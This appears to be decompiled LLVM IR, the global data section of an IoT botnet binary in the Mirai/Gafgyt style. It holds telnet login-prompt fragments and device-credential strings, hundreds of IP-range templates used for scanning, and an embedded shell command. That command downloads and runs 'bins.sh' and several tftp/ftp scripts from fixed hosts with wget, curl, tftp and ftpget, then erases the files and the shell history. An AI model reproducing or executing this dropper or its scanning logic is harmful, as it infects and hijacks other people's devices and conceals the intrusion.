source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%rusage = type { %timeval, %timeval, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%timeval = type { i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805e00c.2 = global i32 0
@global_var_805e024.3 = local_unnamed_addr global i32* @global_var_805e00c.2
@global_var_805e8a4.4 = global i32 0
@global_var_805e8e0.5 = global i32 0
@global_var_805e8e4.6 = local_unnamed_addr global i32 0
@global_var_805e8e8.7 = local_unnamed_addr global i32 0
@global_var_805e614.8 = local_unnamed_addr global i32 4095
@global_var_805e610.9 = local_unnamed_addr global i32 362436
@global_var_80578b2.10 = constant [8 x i8] c"BusyBox\00"
@global_var_80578b0.12 = constant i32 1967259683
@global_var_80578ba.13 = constant [6 x i8] c"shell\00"
@global_var_80578c0.14 = constant [7 x i8] c"dvrdvs\00"
@global_var_805e120.15 = global [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80578b2.10, i32 0, i32 0), i8* bitcast ([10 x i8*]* @global_var_80578ae.11 to i8*), i8* bitcast (i32* @global_var_80578b0.12 to i8*), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80578ba.13, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80578c0.14, i32 0, i32 0)]
@global_var_805787a.16 = constant [7 x i8] c"nvalid\00"
@global_var_8057881.17 = constant [6 x i8] c"ailed\00"
@global_var_8057887.18 = constant [9 x i8] c"ncorrect\00"
@global_var_8057890.19 = constant [6 x i8] c"enied\00"
@global_var_8057896.20 = constant [5 x i8] c"rror\00"
@global_var_805789b.21 = constant [7 x i8] c"oodbye\00"
@global_var_80578a2.22 = constant [4 x i8] c"bad\00"
@global_var_805e100.23 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805787a.16, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057881.17, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057887.18, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057890.19, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057896.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805789b.21, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80578a2.22, i32 0, i32 0)]
@global_var_805a598.24 = constant [7 x i8] c"(null)\00"
@global_var_805a59f.26 = constant [3 x i8] c"-c\00"
@global_var_805a057.27 = constant [3 x i8] c"sh\00"
@global_var_805a5a2.28 = constant [8 x i8] c"/bin/sh\00"
@global_var_805a5c0.29 = constant i32 -1
@global_var_805a9c0.30 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_805a9ce.31 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_805e8c0.32 = local_unnamed_addr global i32 0
@global_var_805a9d7.33 = constant [5 x i8] c"PING\00"
@global_var_805a9dc.34 = constant [14 x i8] c"gethostbyname\00"
@global_var_805e8c8.35 = local_unnamed_addr global i32 0
@global_var_805e8cc.36 = local_unnamed_addr global i32 0
@global_var_8064b54.37 = local_unnamed_addr global i32 0
@global_var_805a9ea.38 = constant [6 x i8] c":>%$#\00"
@global_var_805e8d7.39 = local_unnamed_addr global i32 0
@global_var_805e8d8.40 = local_unnamed_addr global i32 0
@global_var_805a9f1.43 = constant [11 x i8] c"1.10.%d.%d\00"
@global_var_805a9fc.44 = constant [12 x i8] c"1.120.%d.%d\00"
@global_var_805aa08.45 = constant [12 x i8] c"5.140.%d.%d\00"
@global_var_805aa14.46 = constant [12 x i8] c"5.141.%d.%d\00"
@global_var_805aa20.47 = constant [12 x i8] c"122.2.%d.%d\00"
@global_var_805aa2c.48 = constant [12 x i8] c"122.3.%d.%d\00"
@global_var_805aa38.49 = constant [13 x i8] c"122.53.%d.%d\00"
@global_var_805aa45.50 = constant [13 x i8] c"122.54.%d.%d\00"
@global_var_805aa52.51 = constant [13 x i8] c"188.16.%d.%d\00"
@global_var_805aa5f.52 = constant [13 x i8] c"188.17.%d.%d\00"
@global_var_805aa6c.53 = constant [13 x i8] c"188.18.%d.%d\00"
@global_var_805aa79.54 = constant [13 x i8] c"188.19.%d.%d\00"
@global_var_805aa86.55 = constant [13 x i8] c"31.162.%d.%d\00"
@global_var_805aa93.56 = constant [13 x i8] c"31.163.%d.%d\00"
@global_var_805aaa0.57 = constant [12 x i8] c"5.142.%d.%d\00"
@global_var_805aaac.58 = constant [12 x i8] c"5.143.%d.%d\00"
@global_var_805aab8.59 = constant [13 x i8] c"90.150.%d.%d\00"
@global_var_805aac5.60 = constant [13 x i8] c"90.151.%d.%d\00"
@global_var_805aad2.61 = constant [13 x i8] c"178.47.%d.%d\00"
@global_var_805aadf.62 = constant [12 x i8] c"94.50.%d.%d\00"
@global_var_805aaeb.63 = constant [12 x i8] c"94.51.%d.%d\00"
@global_var_805aaf7.64 = constant [13 x i8] c"190.43.%d.%d\00"
@global_var_805ab04.65 = constant [12 x i8] c"210.5.%d.%d\00"
@global_var_805ab10.66 = constant [14 x i8] c"210.213.%d.%d\00"
@global_var_805ab1e.67 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_805ab29.68 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_805ab34.69 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_805ab40.70 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_805ab4c.71 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_805ab58.72 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_805ab65.73 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_805ab72.74 = constant [14 x i8] c"186.128.%d.%d\00"
@global_var_805ab80.75 = constant [14 x i8] c"186.132.%d.%d\00"
@global_var_805ab8e.76 = constant [13 x i8] c"186.39.%d.%d\00"
@global_var_805ab9b.77 = constant [13 x i8] c"186.56.%d.%d\00"
@global_var_805aba8.78 = constant [13 x i8] c"186.57.%d.%d\00"
@global_var_805abb5.79 = constant [13 x i8] c"186.58.%d.%d\00"
@global_var_805abc2.80 = constant [13 x i8] c"186.60.%d.%d\00"
@global_var_805abcf.81 = constant [13 x i8] c"46.181.%d.%d\00"
@global_var_805abdc.82 = constant [13 x i8] c"46.180.%d.%d\00"
@global_var_805abe9.83 = constant [14 x i8] c"188.173.%d.%d\00"
@global_var_805abf7.84 = constant [13 x i8] c"64.137.%d.%d\00"
@global_var_805ac04.85 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_805ac11.86 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_805ac1e.87 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_805ac2b.88 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_805ac38.89 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_805ac45.90 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_805ac53.91 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_805ac60.92 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_805ac6e.93 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_805ac7c.94 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_805ac8a.95 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_805ac98.96 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_805aca5.97 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_805acb3.98 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_805acc1.99 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_805accf.100 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_805acdd.101 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_805aceb.102 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_805acf9.103 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_805ad06.104 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_805ad14.105 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_805ad22.106 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_805ad30.107 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_805ad3d.108 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_805ad4a.109 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_805ad57.110 = constant [12 x i8] c"98.27.%d.%d\00"
@global_var_805ad63.111 = constant [13 x i8] c"98.179.%d.%d\00"
@global_var_805ad70.112 = constant [13 x i8] c"98.113.%d.%d\00"
@global_var_805ad7d.113 = constant [13 x i8] c"98.121.%d.%d\00"
@global_var_805ad8a.114 = constant [13 x i8] c"98.100.%d.%d\00"
@global_var_805ad97.115 = constant [13 x i8] c"98.161.%d.%d\00"
@global_var_805ada4.116 = constant [13 x i8] c"98.165.%d.%d\00"
@global_var_805adb1.117 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_805adbd.118 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_805adcb.119 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_805add6.120 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_805ade3.121 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_805adee.122 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_805adfb.123 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_805ae07.124 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_805ae14.125 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_805ae21.126 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_805ae2e.127 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_805ae3c.128 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_805ae47.129 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_805ae54.130 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_805ae61.131 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_805ae6e.132 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_805ae7b.133 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_805ae86.134 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_805ae92.135 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_805ae9f.136 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_805aeab.137 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_805aeb8.138 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_805aec4.139 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_805aecf.140 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_805aedb.141 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_805aee7.142 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_805aef3.143 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_805aeff.144 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_805af0b.145 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_805af18.146 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_805af25.147 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_805af32.148 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_805af3f.149 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_805af4c.150 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_805af59.151 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_805af66.152 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_805af73.153 = constant [12 x i8] c"77.96.%d.%d\00"
@global_var_805af7f.154 = constant [12 x i8] c"77.97.%d.%d\00"
@global_var_805af8b.155 = constant [12 x i8] c"77.98.%d.%d\00"
@global_var_805af97.156 = constant [13 x i8] c"77.100.%d.%d\00"
@global_var_805afa4.157 = constant [13 x i8] c"77.102.%d.%d\00"
@global_var_805afb1.158 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_805afbf.159 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_805afcc.160 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_805afda.161 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_805afe8.162 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_805aff5.163 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_805b002.164 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_805b00f.165 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_805b01c.166 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_805b029.167 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_805b036.168 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_805b043.169 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_805b050.170 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_805b05d.171 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_805b06a.172 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_805b077.173 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_805b084.174 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_805b091.175 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_805b09e.176 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_805b0ab.177 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_805b0b8.178 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_805b0c5.179 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_805b0d2.180 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_805b0df.181 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_805b0ec.182 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_805b0f9.183 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_805b106.184 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_805b113.185 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_805b120.186 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_805b12d.187 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_805b13a.188 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_805b147.189 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_805b154.190 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_805b161.191 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_805b16e.192 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_805b17b.193 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_805b188.194 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_805b195.195 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_805b1a2.196 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_805b1af.197 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_805b1bc.198 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_805b1c9.199 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_805b1d6.200 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_805b1e3.201 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_805b1f0.202 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_805b1fd.203 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_805b20a.204 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_805b216.205 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_805b223.206 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_805b230.207 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_805b23d.208 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_805b249.209 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_805b256.210 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_805b264.211 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_805b272.212 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_805b27f.213 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_805b28d.214 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_805b29b.215 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_805b2a8.216 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_805b2b6.217 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_805b2c3.218 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_805b2d1.219 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_805b2df.220 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_805b2ed.221 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_805b2fb.222 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_805b308.223 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_805b314.224 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_805b322.225 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_805b330.226 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_805b33e.227 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_805b34c.228 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_805b35a.229 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_805b368.230 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_805b376.231 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_805b384.232 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_805b392.233 = constant [14 x i8] c"116.167.%d.%d\00"
@global_var_805b3a0.234 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_805b3ae.235 = constant [13 x i8] c"113.17.%d.%d\00"
@global_var_805b3bb.236 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_805b3c8.237 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_805b3d5.238 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_805b3e2.239 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_805b3ef.240 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_805b3fc.241 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_805b40a.242 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_805b418.243 = constant [14 x i8] c"222.225.%d.%d\00"
@global_var_805b426.244 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_805b433.245 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_805b440.246 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_805b44e.247 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_805b45c.248 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_805b469.249 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_805b476.250 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_805b483.251 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_805b490.252 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_805b49d.253 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_805b4a9.254 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_805b4b6.255 = constant [14 x i8] c"103.233.%d.%d\00"
@global_var_805b4c4.256 = constant [13 x i8] c"103.63.%d.%d\00"
@global_var_805b4d1.257 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_805b4de.258 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_805b4eb.259 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_805b4f8.260 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_805b505.261 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_805b513.262 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_805b521.263 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_805b52f.264 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_805b53d.265 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_805b54b.266 = constant [14 x i8] c"202.134.%d.%d\00"
@global_var_805b559.267 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_805b566.268 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_805b573.269 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_805b581.270 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_805b58f.271 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_805b59d.272 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_805b5ab.273 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_805b5b9.274 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_805b5c7.275 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_805b5d5.276 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_805b5e3.277 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_805b5f0.278 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_805b5fd.279 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_805b60a.280 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_805b617.281 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_805b624.282 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_805b631.283 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_805b63f.284 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_805b64c.285 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_805b659.286 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_805b666.287 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_805b673.288 = constant [13 x i8] c"111.26.%d.%d\00"
@global_var_805b680.289 = constant [13 x i8] c"111.20.%d.%d\00"
@global_var_8064b48.290 = local_unnamed_addr global i32 0
@global_var_805e094 = external global i32
@global_var_805b68d.295 = constant [3 x i8] c"\0D\0A\00"
@global_var_80578a6.296 = constant [8 x i8] c"busybox\00"
@global_var_805e0c0.297 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805787a.16, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057881.17, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057887.18, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057890.19, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057896.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805789b.21, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80578a2.22, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80578a6.296, i32 0, i32 0), i8* bitcast ([10 x i8*]* @global_var_80578ae.11 to i8*), i8* bitcast (i32* @global_var_80578b0.12 to i8*)]
@global_var_805b690.298 = constant i32 926112539
@global_var_805b6d0.299 = constant [485 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.101.107.128/bins.sh; curl -O http://185.158.113.30/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.158.113.30 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.158.113.30; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.158.113.30 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *;history -c;history -w;rm -rf ~/.bash_history\0D\0A\00"
@global_var_805e61c = external local_unnamed_addr global i32
@global_var_8064b20.305 = global i32 0
@global_var_805c080.306 = constant i32 0
@global_var_805e640.307 = global i32 0
@global_var_805e658.308 = global i32 0
@global_var_805e63c.309 = global i32* bitcast (i16* @global_var_805e680.302 to i32*)
@global_var_805c098.310 = constant [6 x i8] c"(nil)\00"
@global_var_805c09e.311 = constant [7 x i8] c"(null)\00"
@global_var_805c0a5.312 = constant i32 2949163
@global_var_805c112.314 = constant i32 327688
@global_var_805c10a.315 = constant [8 x i8] c" +0-#'I\00"
@global_var_805c0b8.316 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_805c0f5.317 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805c0eb.318 = constant i32 117506048
@global_var_805c0dc.319 = constant i32 331776
@global_var_805c160.320 = constant [8 x i8] c"Success\00"
@global_var_805c136.321 = constant [15 x i8] c"Unknown error \00"
@global_var_805d100.322 = constant i32 65536
@global_var_805e880.323 = local_unnamed_addr global i32* @global_var_805d100.322
@global_var_805cd3c.324 = constant [15 x i8] c"Resolver error\00"
@global_var_805ccc2.325 = constant [8 x i8] c"Error 0\00"
@global_var_805ccca.326 = constant [13 x i8] c"Unknown host\00"
@global_var_805ccd7.327 = constant [25 x i8] c"Host name lookup failure\00"
@global_var_805ccf0.328 = constant [21 x i8] c"Unknown server error\00"
@global_var_805cd05.329 = constant [32 x i8] c"No address associated with name\00"
@global_var_805cd28.330 = constant [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805ccc2.325, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805ccca.326, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_805ccd7.327, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_805ccf0.328, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_805cd05.329, i32 0, i32 0)]
@global_var_805cd4b.331 = constant [3 x i8] c": \00"
@global_var_805cd4d.332 = constant i32 0
@global_var_805ccba.333 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_8064904.334 = global i32 0
@global_var_8064920.335 = global i32 0
@global_var_8064aec.336 = global i32 0
@global_var_805e888.337 = global i32 0
@global_var_8064f74.338 = local_unnamed_addr global i32 0
@global_var_8064f68.339 = global i32 0
@global_var_8064b60.340 = global i32 0
@global_var_805e770.341 = global i32 0
@global_var_8064c0c.343 = global i32 0
@global_var_8064c10.344 = local_unnamed_addr global i32 0
@global_var_8064c14.345 = global i32 0
@global_var_8064c20.346 = local_unnamed_addr global i32 0
@global_var_8064f14.347 = global i32 0
@global_var_8064f3c.348 = local_unnamed_addr global i32 0
@global_var_8064f2c.349 = local_unnamed_addr global i32 0
@global_var_8064f30.350 = local_unnamed_addr global i32 0
@global_var_8064f34.351 = local_unnamed_addr global i32 0
@global_var_8064f50.352 = local_unnamed_addr global i32 0
@global_var_8064f38.353 = local_unnamed_addr global i32 0
@global_var_8064f44.354 = local_unnamed_addr global i32 0
@global_var_8064f48.355 = local_unnamed_addr global i32 0
@global_var_8064f54.356 = local_unnamed_addr global i32 0
@global_var_8064f28.357 = local_unnamed_addr global i32 0
@global_var_8064f24.359 = local_unnamed_addr global i32 0
@global_var_8064f4c.360 = local_unnamed_addr global i32 0
@global_var_8064c1c.361 = local_unnamed_addr global i32 0
@global_var_805e788.362 = global i32 0
@global_var_805e7a0.364 = global i32 0
@global_var_805e7b8 = external global i32
@global_var_805e7e4.366 = global i32 -1726662223
@global_var_805e7c0.367 = local_unnamed_addr global i32* @global_var_805e7e4.366
@global_var_805e7bc.368 = global i32* @global_var_805e7e4.366
@global_var_805cd74.369 = constant i32 0
@global_var_805cd60.370 = constant i32 0
@global_var_805cd88.371 = constant [3 x i8] c"-c\00"
@global_var_805cd90.372 = constant [3 x i8] c"sh\00"
@global_var_805cd8b.373 = constant [8 x i8] c"/bin/sh\00"
@global_var_805e860.374 = global i32 0
@global_var_8064b04.375 = local_unnamed_addr global i32 0
@global_var_8064b0c.376 = local_unnamed_addr global i32 0
@global_var_805e000.378 = global i32 -1
@global_var_8054033.379 = constant i32 -294069
@global_var_8064b14.380 = local_unnamed_addr global i32 0
@global_var_8064b18.381 = local_unnamed_addr global i32 0
@global_var_805cfec.382 = constant [10 x i8] c"/dev/null\00"
@global_var_8064b10.384 = local_unnamed_addr global i32 0
@global_var_8064b08.385 = local_unnamed_addr global i32 0
@global_var_805421b.387 = constant i32 1928542531
@global_var_805423f.388 = constant i32 1928542531
@global_var_8064b44.389 = local_unnamed_addr global i32 0
@global_var_8064b24.390 = global i32 0
@global_var_805d310.392 = constant [4 x i8] c"inf\00"
@global_var_805d313.397 = constant i32 1179535616
@global_var_805d320.398 = constant i32 2883630
@global_var_8064b28.399 = global i32 0
@global_var_8064f78.402 = local_unnamed_addr global i32 0
@global_var_805d3dc.403 = constant i32 1697579054
@global_var_805d410.404 = constant i32 1868824690
@global_var_805d3de.405 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805d3ef.406 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_805d407.407 = constant [11 x i8] c"nameserver\00"
@global_var_805d412.408 = constant [7 x i8] c"domain\00"
@global_var_805d419.409 = constant [7 x i8] c"search\00"
@global_var_8064f58.410 = global i32 0
@global_var_8064f7c.411 = local_unnamed_addr global i32 0
@global_var_8064f80.412 = local_unnamed_addr global i32 0
@global_var_80628e4.413 = local_unnamed_addr global i32 0
